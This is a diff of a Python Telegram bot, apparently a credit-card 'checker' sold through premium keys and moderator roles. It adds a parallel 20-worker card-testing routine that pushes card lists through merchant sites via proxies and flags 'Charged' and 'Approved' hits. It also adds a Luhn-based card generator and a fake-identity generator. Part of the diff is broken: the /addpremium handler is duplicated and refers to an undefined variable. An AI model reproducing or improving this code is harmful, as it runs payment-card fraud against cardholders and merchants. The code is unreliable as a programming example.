+            await event.reply(premium_emoji("📝 Usage: <code>/addmo &lt;user_id&gt;</code>"), parse_mode='html')
             return
         
         target_id = int(parts[1])
         
-        if await add_premium_user(target_id):
-            await event.reply(premium_emoji(f"✅ User <code>{target_id}</code> added to premium!"), parse_mode='html')
+        # Check if already moderator
+        if is_moderator(target_id):
+            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is already a moderator."), parse_mode='html')
+            return
+        
+        # Check if admin
+        if is_admin(target_id):
+            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is an admin."), parse_mode='html')
+            return
+        
+        if await add_moderator(target_id):
+            await send_result_with_buttons(event, premium_emoji(f"✅ User <code>{target_id}</code> has been added as moderator!\n\n📋 <b>Moderator Permissions:</b>\n├─ Generate premium keys with /key\n├─ Remove premium users with /removepremium\n└─ Full access to all bot tools"))
             try:
-                await bot.send_message(target_id, premium_emoji("🎉 Congratulations! You have been granted premium access to the bot!"), parse_mode='html')
+                await bot.send_message(target_id, premium_emoji("🎉 Congratulations! You have been appointed as a moderator!\n\n💡 Use /key to generate premium keys."), parse_mode='html')
             except:
                 pass
         else:
-            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is already premium."), parse_mode='html')
+            await send_result_with_buttons(event, premium_emoji(f"❌ Failed to add user <code>{target_id}</code> as moderator."))
     
     except ValueError:
         await event.reply(premium_emoji("❌ Invalid user ID."), parse_mode='html')
     except Exception as e:
         await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
 
+@bot.on(events.NewMessage(pattern='/addpremium'))
+async def add_premium_command(event):
+    """DEPRECATED: Use key system instead."""
+    user_id = event.sender_id
+    
+    if not is_admin_or_moderator(user_id):
+        await event.reply(premium_emoji("❌ Access Denied. Admin/Moderator only."), parse_mode='html')
+        return
+    
+    
+    await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern='/addpremium'))
+async def add_premium_command(event):
+    """DEPRECATED: Use key system instead."""
+    user_id = event.sender_id
+
+    if not is_admin_or_moderator(user_id):
+        await event.reply(premium_emoji("❌ Access Denied. Admin/Moderator only."), parse_mode='html')
+        return
+
+    await send_result_with_buttons(event, premium_emoji("⚠️ <b>This command is deprecated!</b>\n\n💡 Please use the key system instead:\n├─ Admin/Mod: <code>/key &lt;count&gt; &lt;days&gt;</code>\n└─ Users: <code>/redeem &lt;key&gt;</code>"))
+
+
 @bot.on(events.NewMessage(pattern='/removepremium'))
 async def remove_premium_command(event):
     user_id = event.sender_id
     
-    if user_id not in ADMIN_ID:
-        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
+    # Both admin and moderator can use this command
+    if not is_admin_or_moderator(user_id):
+        await event.reply(premium_emoji("❌ Access Denied. Admin/Moderator only."), parse_mode='html')
         return
+    
+    is_admin_user = is_admin(user_id)
     
     try:
         parts = event.raw_text.split()
@@ -1415,30 +2162,36 @@ async def remove_premium_command(event):
         
         target_id = int(parts[1])
         
+        # Moderators cannot remove admin
         if target_id in ADMIN_ID:
             await event.reply(premium_emoji("⚠️ Cannot remove admin from premium."), parse_mode='html')
             return
         
+        # Only admin can remove other moderators
+        if is_moderator(target_id) and not is_admin_user:
+            await event.reply(premium_emoji("⚠️ Only admin can remove moderators."), parse_mode='html')
+            return
+        
         if await remove_premium_user(target_id):
-            await event.reply(premium_emoji(f"✅ User <code>{target_id}</code> removed from premium."), parse_mode='html')
+            await send_result_with_buttons(event, premium_emoji(f"✅ User <code>{target_id}</code> removed from premium."))
             try:
                 await bot.send_message(target_id, premium_emoji("⚠️ Your premium access has been revoked."), parse_mode='html')
             except:
                 pass
         else:
-            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is not premium."), parse_mode='html')
-    
+            await send_result_with_buttons(event, premium_emoji(f"⚠️ User <code>{target_id}</code> is not premium."))
+
     except ValueError:
-        await event.reply(premium_emoji("❌ Invalid user ID."), parse_mode='html')
+        await send_result_with_buttons(event, premium_emoji("❌ Invalid user ID."))
     except Exception as e:
-        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+        await send_result_with_buttons(event, premium_emoji(f"❌ Error: {e}"))
 
 @bot.on(events.NewMessage(pattern='/listpremium'))
 async def list_premium_command(event):
     user_id = event.sender_id
     
-    if user_id not in ADMIN_ID:
-        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
+    if not is_admin_or_moderator(user_id):
+        await event.reply(premium_emoji("❌ Access Denied. Admin/Moderator only."), parse_mode='html')
         return
     
     premium_users = load_premium_users()
@@ -1448,31 +2201,33 @@ async def list_premium_command(event):
         return
     
     premium_list = "\n".join([f"• <code>{uid}</code>" for uid in premium_users])
-    
-    await event.reply(premium_emoji(f"👑 <b>Premium Users ({len(premium_users)})</b>\n\n{premium_list}"), parse_mode='html')
+
+    await send_result_with_buttons(event, premium_emoji(f"👑 <b>Premium Users ({len(premium_users)})</b>\n\n{premium_list}"))
 
 @bot.on(events.NewMessage(pattern='/stats'))
 async def stats_command(event):
     user_id = event.sender_id
     
-    if user_id not in ADMIN_ID:
+    if not is_admin(user_id):
         await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
         return
     
     premium_users = load_premium_users()
     sites = load_sites()
     proxies = load_proxies()
+    moderators = load_moderators()
     
     stats_text = f"""📊 <b>Bot Statistics</b>
 
 👑 <b>Admins:</b> {len(ADMIN_ID)}
+👥 <b>Moderators:</b> {len(moderators)}
 💎 <b>Premium Users:</b> {len(premium_users)}
 🌐 <b>Sites:</b> {len(sites)}
 🔌 <b>Proxies:</b> {len(proxies)}
 
 🤖 <b>Bot Status:</b> Running ✅"""
-    
-    await event.reply(premium_emoji(stats_text), parse_mode='html')
+
+    await send_result_with_buttons(event, premium_emoji(stats_text))
 
 
 @bot.on(events.NewMessage(pattern=r'/start@\w+'))
@@ -1484,6 +2239,12 @@ async def handle_start_bot_username(event):
 @bot.on(events.NewMessage)
 async def handle_txt_file_upload(event):
     """Handle direct .txt file uploads for card checking."""
+    user_id = event.sender_id
+
+    # Skip if user is waiting for supercln command
+    if user_id in supercln_waiting_users:
+        return
+
     # Check if message is a file upload
     if not event.file:
         return
@@ -1599,8 +2360,14 @@ async def sptxt_check_callback(event):
             await event.edit(premium_emoji("❌ No cards found in the file."), parse_mode='html')
             return
 
-        if len(cards) > 5000:
-            cards = cards[:5000]
+        # Determine card limit based on user type
+        if is_admin(user_id):
+            card_limit = 10000
+        elif is_premium(user_id):
+            card_limit = 1500
+
+        if len(cards) > card_limit:
+            cards = cards[:card_limit]
 
         total_cards = len(cards)
 
@@ -1648,15 +2415,16 @@ async def sptxt_check_callback(event):
                         break
 
                     card_count += 1
+                    # Sleep 5 seconds after every 10 cards
                     if card_count % 10 == 0:
-                        await asyncio.sleep(random.uniform(5, 6))
+                        await asyncio.sleep(5)
 
                     current_sites = load_sites()
                     current_proxies = load_proxies()
                     if not current_sites or not current_proxies:
                         break
 
-                    res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
+                    res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=5)
 
                     all_results['checked'] += 1
                     all_results['last_card'] = card
@@ -1666,10 +2434,22 @@ async def sptxt_check_callback(event):
 
                     if res['status'] == 'Charged':
                         all_results['charged'].append(res)
-                        await send_realtime_hit(user_id, res, 'Charged', username)
+                        # Send bot message for Charged cards and pin it
+                        try:
+                            sent_msg = await send_realtime_hit(user_id, res, 'Charged', username)
+                            if sent_msg:
+                                await sent_msg.pin()
+                        except Exception:
+                            pass
                     elif res['status'] == 'Approved':
                         all_results['approved'].append(res)
-                        await send_realtime_hit(user_id, res, 'Approved', username)
+                        # Only send bot message for Approved cards with INSUFFICIENT_FUNDS
+                        response_lower = res.get('message', '').lower()
+                        if 'insufficient_funds' in response_lower or 'insufficient funds' in response_lower:
+                            try:
+                                await send_realtime_hit(user_id, res, 'Approved', username)
+                            except Exception:
+                                pass
                     else:
                         all_results['dead'].append(res)
 
@@ -1767,6 +2547,132 @@ async def bin_lookup_command(event):
         await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
 
 
+@bot.on(events.NewMessage(pattern=r'^/gen\s+'))
+async def gen_cards_command(event):
+    """
+    /gen command - Generate credit cards using Luhn algorithm.
+    Formats:
+    /gen <BIN> <limit> - Generate cards with BIN only
+    /gen <BIN|MM|YYYY|> <limit> - Generate with date
+    /gen <BIN|MM|YYYY|CVV> <limit> - Generate with date and CVV
+    """
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
+        return
+
+    try:
+        args = event.message.text.split(' ', 1)
+        if len(args) < 2:
+            await event.reply(premium_emoji("❌ Usage:\n<code>/gen BIN limit</code>\n<code>/gen BIN|MM|YYYY limit</code>\n<code>/gen BIN|MM|YYYY|CVV limit</code>"), parse_mode='html')
+            return
+
+        parts = args[1].strip().split()
+        if len(parts) < 2:
+            await event.reply(premium_emoji("❌ Please provide both card pattern and limit.\nExample: <code>/gen 546008 10</code>"), parse_mode='html')
+            return
+
+        card_pattern = parts[0]
+        try:
+            limit = int(parts[1])
+            if limit < 1 or limit > 1000:
+                await event.reply(premium_emoji("❌ Limit must be between 1 and 1000."), parse_mode='html')
+                return
+        except ValueError:
+            await event.reply(premium_emoji("❌ Limit must be a number."), parse_mode='html')
+            return
+
+        # Parse the card pattern
+        bin_number = ""
+        fixed_month = None
+        fixed_year = None
+        fixed_cvv = None
+
+        if '|' in card_pattern:
+            pattern_parts = card_pattern.split('|')
+            bin_number = pattern_parts[0]
+
+            if len(pattern_parts) >= 2:
+                fixed_month = pattern_parts[1] if pattern_parts[1] else None
+            if len(pattern_parts) >= 3:
+                year_str = pattern_parts[2]
+                # Handle 2 or 4 digit year
+                if year_str:
+                    if len(year_str) == 2:
+                        fixed_year = '20' + year_str
+                    else:
+                        fixed_year = year_str
+            if len(pattern_parts) >= 4:
+                fixed_cvv = pattern_parts[3] if pattern_parts[3] else None
+        else:
+            bin_number = card_pattern
+
+        # Validate BIN
+        if len(bin_number) < 6:
+            await event.reply(premium_emoji("❌ BIN must be at least 6 digits."), parse_mode='html')
+            return
+
+        # Detect card type and get proper length
+        card_type = detect_card_type(bin_number)
+        card_length = get_card_length(card_type)
+        cvv_length = get_cvv_length(card_type)
+
+        # Send processing message
+        bin_for_display = bin_number[:6]
+        status_msg = await event.reply(premium_emoji(f"🔄 Processing Card Generate\n💸 Bin: <code>{bin_for_display}</code>"), parse_mode='html')
+
+        # Generate cards
+        generated_cards = []
+        for _ in range(limit):
+            # Generate card number with Luhn algorithm
+            card_number = generate_luhn_number(bin_number, card_length)
+
+            # Generate or use fixed month
+            if fixed_month:
+                month = fixed_month
+            else:
+                month = str(random.randint(1, 12)).zfill(2)
+
+            # Generate or use fixed year
+            if fixed_year:
+                year = fixed_year
+            else:
+                year = str(random.randint(2025, 2030))
+
+            # Generate or use fixed CVV
+            if fixed_cvv:
+                cvv = fixed_cvv
+            else:
+                cvv = ''.join([str(random.randint(0, 9)) for _ in range(cvv_length)])
+
+            card_format = f"{card_number}|{month}|{year}|{cvv}"
+            generated_cards.append(card_format)
+
+        # Create filename
+        filename = f"BrainAi_{bin_for_display}_{len(generated_cards)}.txt"
+
+        # Save to file
+        async with aiofiles.open(filename, 'w') as f:
+            for card in generated_cards:
+                await f.write(f"{card}\n")
+
+        # Edit status message
+        await status_msg.edit(premium_emoji(f"✅ Generated {len(generated_cards)} cards!\n💸 Bin: <code>{bin_for_display}</code>\n📁 File: <code>{filename}</code>"), parse_mode='html')
+
+        # Send file
+        await bot.send_message(user_id, premium_emoji("🎁 Here are your generated cards:"), file=filename, parse_mode='html')
+
+        # Cleanup
+        try:
+            os.remove(filename)
+        except:
+            pass
+
+    except Exception as e:
+        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+
+
 @bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
 async def stop_handler(event):
     match = event.pattern_match
@@ -1775,8 +2681,446 @@ async def stop_handler(event):
     session_key = f"{user_id}_{message_id}"
     if session_key in active_sessions:
         del active_sessions[session_key]
-        await event.answer(" Stopped", alert=True)
+        await event.answer("❌ Stopped", alert=True)
         await event.edit(premium_emoji("🛑 Checking stopped by user."), parse_mode='html')
 
-print("✅ Bot started successfully!")
-bot.run_until_disconnected()
+@bot.on(events.CallbackQuery(pattern=rb"pause_(\d+)_(\d+)"))
+async def pause_handler(event):
+    """Handle pause button click."""
+    match = event.pattern_match
+    user_id = int(match.group(1).decode())
+    message_id = int(match.group(2).decode())
+    session_key = f"{user_id}_{message_id}"
+
+    if session_key in active_sessions:
+        active_sessions[session_key]['paused'] = True
+        await event.answer("📍 PAUSED", alert=True)
+    else:
+        await event.answer("❌ Session not found", alert=True)
+
+@bot.on(events.CallbackQuery(pattern=rb"resume_(\d+)_(\d+)"))
+async def resume_handler(event):
+    """Handle resume button click."""
+    match = event.pattern_match
+    user_id = int(match.group(1).decode())
+    message_id = int(match.group(2).decode())
+    session_key = f"{user_id}_{message_id}"
+
+    if session_key in active_sessions:
+        active_sessions[session_key]['paused'] = False
+        await event.answer("🔘 RESUMED", alert=True)
+    else:
+        await event.answer("❌ Session not found", alert=True)
+
+# ==================== SPTXT COMMAND WITH 20 WORKERS AND SPECIAL FORMAT ====================
+
+sptxt_sessions = {}
+
+@bot.on(events.NewMessage(pattern=r'^/sptxt\s+'))
+async def sptxt_command(event):
+    """
+    /sptxt command - Process multiple cards with 20 parallel workers.
+    Usage: /sptxt card1|mm|yy|cvv card2|mm|yy|cvv ...
+    Or: /sptxt (reply to a message containing cards)
+    """
+    user_id = event.sender_id
+
+    try:
+        sender = await event.get_sender()
+        username = sender.username if sender.username else f"user_{user_id}"
+    except:
+        username = f"user_{user_id}"
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
+        return
+
+    sites = load_sites()
+    proxies = load_proxies()
+
+    if not sites:
+        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
+        return
+    if not proxies:
+        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
+        return
+
+    # Extract cards from message or reply
+    cards = []
+    text = event.message.text
+
+    # Check if it's a reply to a message with cards
+    if event.reply_to_msg_id:
+        reply_msg = await event.get_reply_message()
+        if reply_msg:
+            text += " " + reply_msg.text
+
+    # Try to extract cards from the text
+    cards = extract_cc(text)
+
+    if not cards:
+        await event.reply(premium_emoji("❌ No valid cards found.\n\nUsage: <code>/sptxt card1|mm|yy|cvv card2|mm|yy|cvv ...</code>\nOr reply to a message containing cards."), parse_mode='html')
+        return
+
+    if len(cards) > 100:
+        await event.reply(premium_emoji(f"⚠️ Too many cards. Limiting to first 100 cards."), parse_mode='html')
+        cards = cards[:100]
+
+    total_cards = len(cards)
+
+    # Create a unique session for this sptxt command
+    session_id = f"sptxt_{user_id}_{int(time.time())}"
+    sptxt_sessions[session_id] = {
+        'cards': cards,
+        'results': [],
+        'checked': 0,
+        'sites': sites,
+        'proxies': proxies,
+        'user_id': user_id,
+        'username': username
+    }
+
+    # Send initial message showing cards being checked
+    status_msg = await event.reply(premium_emoji(f"🔄 Starting parallel check for {total_cards} cards with 20 workers..."), parse_mode='html')
+
+    # Start the parallel checking with real-time updates
+    await run_sptxt_check(session_id, status_msg)
+
+
+async def run_sptxt_check(session_id, status_msg):
+    """Run the sptxt check with 20 parallel workers and real-time output."""
+    session = sptxt_sessions.get(session_id)
+    if not session:
+        return
+
+    cards = session['cards']
+    sites = session['sites']
+    proxies = session['proxies']
+    user_id = session['user_id']
+    username = session['username']
+    total_cards = len(cards)
+
+    # Store all results
+    all_results = {
+        'charged': [],
+        'approved': [],
+        'dead': [],
+        'total': total_cards,
+        'checked': 0
+    }
+
+    # Create queue for cards
+    queue = asyncio.Queue()
+    for card in cards:
+        queue.put_nowait(card)
+
+    # Track which cards are being checked for real-time display
+    checking_cards = {}
+    lock = asyncio.Lock()
+
+    async def update_status_display():
+        """Update the status message with current checking cards."""
+        while all_results['checked'] < total_cards:
+            async with lock:
+                current_checking = list(checking_cards.values())
+
+            if current_checking:
+                # Build the display message with all cards being checked
+                display_lines = []
+                for card_info in current_checking[:20]:  # Show up to 20 cards
+                    display_lines.append(f"----------------------------------")
+                    display_lines.append(f"🔄 Card Checking")
+                    display_lines.append(f"💳 CC: <code>{card_info['card']}</code>")
+                    display_lines.append(f"🌍 Site: <code>{card_info['site']}</code>")
+                    display_lines.append(f"----------------------------------")
+
+                display_lines.append(f"\n📊 Progress: {all_results['checked']}/{total_cards}")
+
+                try:
+                    await status_msg.edit(premium_emoji("\n".join(display_lines)), parse_mode='html')
+                except:
+                    pass
+
+            await asyncio.sleep(2)  # Update every 2 seconds
+
+    async def worker():
+        """Worker that checks cards from the queue."""
+        worker_id = id(asyncio.current_task())
+
+        while not queue.empty():
+            try:
+                card = queue.get_nowait()
+            except asyncio.QueueEmpty:
+                break
+
+            # Select site and proxy for this card
+            site = random.choice(sites) if sites else None
+            proxy = random.choice(proxies) if proxies else None
+
+            # Track this card as being checked
+            async with lock:
+                checking_cards[worker_id] = {'card': card, 'site': site or 'Loading...'}
+
+            # Check the card
+            res = await check_card_with_retry(card, sites, proxies, max_retries=5)
+
+            # Remove from checking tracking
+            async with lock:
+                if worker_id in checking_cards:
+                    del checking_cards[worker_id]
+
+            # Store result
+            all_results['checked'] += 1
+
+            if res['status'] == 'Charged':
+                all_results['charged'].append(res)
+                await send_realtime_hit(user_id, res, 'Charged', username)
+            elif res['status'] == 'Approved':
+                all_results['approved'].append(res)
+                await send_realtime_hit(user_id, res, 'Approved', username)
+            else:
+                all_results['dead'].append(res)
+
+            queue.task_done()
+
+    # Start the status display updater
+    status_task = asyncio.create_task(update_status_display())
+
+    # Create 20 workers
+    workers = [asyncio.create_task(worker()) for _ in range(20)]
+
+    # Wait for all workers to complete
+    await asyncio.gather(*workers, return_exceptions=True)
+
+    # Cancel the status updater
+    status_task.cancel()
+    try:
+        await status_task
+    except asyncio.CancelledError:
+        pass
+
+    # Send final results with the special format
+    await send_sptxt_final_results(user_id, all_results, cards, sites)
+
+    # Clean up session
+    if session_id in sptxt_sessions:
+        del sptxt_sessions[session_id]
+
+
+async def send_sptxt_final_results(user_id, results, cards, sites):
+    """Send final results for sptxt command with special format."""
+
+    # Build the final results message with special format
+    result_lines = []
+
+    # Process all checked cards and get their info
+    all_card_results = results['charged'] + results['approved'] + results['dead']
+
+    for res in all_card_results:
+        card = res['card']
+        status = res['status']
+        message = res.get('message', '')
+        price = res.get('price', '-')
+
+        # Get BIN info
+        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
+
+        # Format based on status
+        if status == 'Charged':
+            status_header = "💎 CHARGED"
+        elif status == 'Approved':
+            status_header = "✅ APPROVED"
+        else:
+            status_header = "❌ DECLINED"
+
+        # Build the card result in the special format
+        card_result = f"""=======================
+{status_header}
+💳 CC: <code>{card}</code>
+💸 Price: {price}
+
+-------------------------------
+🆔 BIN Info : {brand} - {bin_type} - {level}
+🏦 Bank : {bank}
+🥰 Country : {country} {flag}
+======================="""
+
+        result_lines.append(card_result)
+
+    # Send the results in chunks if needed
+    if result_lines:
+        # Join all results
+        full_output = "\n\n".join(result_lines)
+
+        # Send as file if too long
+        if len(full_output) > 4000:
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"sptxt_results_{user_id}_{timestamp}.txt"
+
+            async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
+                await f.write("SPTXT CHECK RESULTS\n")
+                await f.write("=" * 50 + "\n\n")
+                await f.write(full_output)
+
+            await bot.send_message(user_id, premium_emoji("✅ Check complete! Results attached."), file=filename, parse_mode='html')
+
+            try:
+                os.remove(filename)
+            except:
+                pass
+        else:
+            await bot.send_message(user_id, premium_emoji(full_output), parse_mode='html')
+
+    # Send summary
+    summary = f"""📊 Check Complete!
+
+💎 Charged: {len(results['charged'])}
+✅ Approved: {len(results['approved'])}
+❌ Declined: {len(results['dead'])}
+📊 Total: {results['total']}"""
+
+    await bot.send_message(user_id, premium_emoji(summary), parse_mode='html')
+
+
+# ==================== END SPTXT COMMAND ====================
+
+
+@bot.on(events.NewMessage(pattern='/fakedetails'))
+async def fake_details_command(event):
+    """
+    /fakedetails command - Generate fake personal details using Faker.
+    Includes Full Name, Address, Email, and Phone Number.
+    All fields are clickable to copy.
+    """
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
+        return
+
+    try:
+        # Generate fake details using Faker
+        full_name = fake.name()
+        street_address = fake.street_address()
+        city = fake.city()
+        state = fake.state()
+        zip_code = fake.zipcode()
+        full_address = f"{street_address}, {city}, {state}, {zip_code}"
+        email = fake.email()
+        phone = fake.phone_number()
+
+        # Format the output with all details and copy buttons
+        fake_details_text = f"""🔮 <b>Fake Details Generator</b>
+🔥 ━━━━━━━━━━━━━━━━━━
+
+👥 <b>Full Name:</b>
+<code>{full_name}</code>
+
+📋 <b>Address:</b>
+<code>{full_address}</code>
+
+📧 <b>Email:</b>
+<code>{email}</code>
+
+📞 <b>Phone Number:</b>
+<code>{phone}</code>
+
+🔥 ━━━━━━━━━━━━━━━━━━
+💡 <b>Tip:</b> Tap on any field to copy
+💡 Made by @White_DeviL3620"""
+
+        # Add buttons for regenerate
+        buttons = [[Button.inline("🔄 Generate New", b"fake_details_regen", style="primary")]]
+
+        await event.reply(premium_emoji(fake_details_text), buttons=buttons, parse_mode='html')
+
+    except Exception as e:
+        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+
+
+@bot.on(events.CallbackQuery(data=b"fake_details_regen"))
+async def fake_details_regenerate(event):
+    """Regenerate fake details when button is clicked."""
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.answer("❌ Access Denied. Only premium users can use this bot.", alert=True)
+        return
+
+    try:
+        # Generate new fake details using Faker
+        full_name = fake.name()
+        street_address = fake.street_address()
+        city = fake.city()
+        state = fake.state()
+        zip_code = fake.zipcode()
+        full_address = f"{street_address}, {city}, {state}, {zip_code}"
+        email = fake.email()
+        phone = fake.phone_number()
+
+        # Format the output with all details
+        fake_details_text = f"""🔮 <b>Fake Details Generator</b>
+🔥 ━━━━━━━━━━━━━━━━━━
+
+👥 <b>Full Name:</b>
+<code>{full_name}</code>
+
+📋 <b>Address:</b>
+<code>{full_address}</code>
+
+📧 <b>Email:</b>
+<code>{email}</code>
+
+📞 <b>Phone Number:</b>
+<code>{phone}</code>
+
+🔥 ━━━━━━━━━━━━━━━━━━
+💡 <b>Tip:</b> Tap on any field to copy
+💡 Made by @White_DeviL3620"""
+
+        # Add buttons for regenerate
+        buttons = [[Button.inline("🔄 Generate New", b"fake_details_regen", style="primary")]]
+
+        await event.edit(premium_emoji(fake_details_text), buttons=buttons, parse_mode='html')
+        await event.answer("✅ New fake details generated!", alert=False)
+
+    except Exception as e:
+        await event.answer(f"❌ Error: {e}", alert=True)
+
+
+# ==================== BACKGROUND TASKS ====================
+
+async def expire_keys_task():
+    """Background task to check and deactivate expired keys every hour."""
+    while True:
+        try:
+            await deactivate_expired_keys()
+            await asyncio.sleep(3600)  # Check every hour
+        except Exception as e:
+            print(f"Error in expire_keys_task: {e}")
+            await asyncio.sleep(3600)
+
+if __name__ == "__main__":
+    # Start background task and run bot
+    # Use the bot's event loop to avoid conflicts
+    print("🚀 Starting bot...")
+    # Start the bot (this creates and manages the event loop)
+    bot.start(bot_token=BOT_TOKEN)
+    print("✅ Bot connected successfully!")
+    # Start background task
+    bot.loop.create_task(expire_keys_task())
+    print("✅ Background tasks started!")
+    print("🔄 Bot is now running. Press Ctrl+C to stop.")
+    
+    # Keep the bot running until interrupted
+    try:
+        # Use the bot's idle to keep the script running
+        bot.run_until_disconnected()
+    except KeyboardInterrupt:
+        print("\n🛑 Stopping bot...")
+    finally:
+        try:
+            bot.disconnect()
+            print("✅ Bot disconnected.")
+        except Exception as e:
+            print(f"❌ Error during disconnect: {e}")
